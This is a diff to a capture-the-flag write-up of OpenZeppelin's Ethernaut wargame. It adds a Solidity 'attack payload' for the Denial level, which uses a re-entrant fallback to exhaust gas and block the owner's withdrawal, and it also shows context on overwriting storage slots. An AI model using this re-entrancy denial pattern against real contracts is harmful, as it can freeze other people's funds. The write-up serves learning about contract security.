@@ -651,6 +651,7 @@ Useful Resources:
 - [Solution](https://github.com/STYJ/Ethernaut-Solutions)
 
 **Solution:** \
+Attack Payload:
 ```
 pragma solidity ^0.8.0;
 
@@ -702,3 +703,44 @@ Integrate the above formula, namely: `2^256 = keccak256(slot) + index`
 Rearrange it, that is: `index = 2^256 - keccak256(slot)`
 As long as the revise function is called and the address of the player is written into `codex[2^256 – keccak256(slot)]`, the address of the original `owner` can be overwritten to complete this level. 
 
+
+
+
+
+# 20. [Challenge 20: Denial](https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3)
+
+Tasks:
+- This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
+
+**Solution:** \
+Attack Payload:
+```
+pragma solidity ^0.8.0;
+
+interface IDenial {
+    function withdraw() external;
+    function setWithdrawPartner(address _partner) external;
+}
+
+contract Denial {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    fallback() external payable {
+        IDenial(levelInstance).withdraw();
+    }
+
+    function set() public {
+        IDenial(levelInstance).setWithdrawPartner(address(this));
+    }
+}
+```
+
+This level needs to prevent other people from withdrawing ether from the fund, that is, to prevent the withdrawal function from running. 
+
+Looking at the level code, you can see that in the withdraw function, there is the following code: `partner.call.value(amountToSend)("");`
+
+The partner in the code can be set through the `setWithdrawPartner` function above. Therefore, as long as the partner is set as the smart contract address, you can use `Re-entrancy` to repeatedly call the withdraw function in another contract until the gas is used up and the function cannot continue to execute. 
